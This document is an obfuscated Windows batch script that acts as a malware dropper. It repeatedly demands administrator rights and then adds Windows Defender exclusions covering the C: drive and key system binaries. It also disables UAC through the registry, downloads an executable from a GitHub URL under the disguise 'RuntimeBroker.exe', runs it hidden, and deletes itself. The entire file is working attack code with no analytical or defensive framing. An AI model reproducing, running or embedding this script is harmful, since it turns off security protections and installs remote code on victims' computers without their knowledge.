@echo off & setlocal enableDelayedExpansion
set "fjFaf=2>&1" & set "SGD=SESSION" & set "gOvEJ=NET" & set "jNcDf=>nul"
%gOvEJ% %SGD% %jNcDf% %fjFaf%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "zafSG=qux" & set "ikf=bar" & set "cHHJ=foo" & set "PFXh=baz" & rem BgP eUXl wAPJ
set "QtWBi=powershell -ExecutionPolicy Bypass -Command"
set "ROU=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "oOcqV='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "QDzDt='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!QtWBi! "!ROU! !oOcqV! !QDzDt!" %jNcDf% %fjFaf%
set "Ciqte=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "lmO=-Name 'EnableLUA' -Value 0"
!QtWBi! "!Ciqte! !lmO!" %jNcDf% %fjFaf%
set "ECP=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!QtWBi! "!ECP!" %jNcDf% %fjFaf%
if !errorlevel! neq 0 (goto %a%)
set "KSm=timeout /t" & !KSm! 2 %jNcDf% %fjFaf%
set "hon=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "Iln=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "vMiMr=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!QtWBi! "!hon! !Iln! !vMiMr!" %jNcDf% %fjFaf%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!KSm! 1 %jNcDf% %fjFaf% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %jNcDf% %fjFaf%
del /f /q "%~f0" %jNcDf% %fjFaf%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %jNcDf% %fjFaf%
if !errorlevel! neq 0 (!KSm! 3 %jNcDf% %fjFaf% & goto %b%)
exit /b
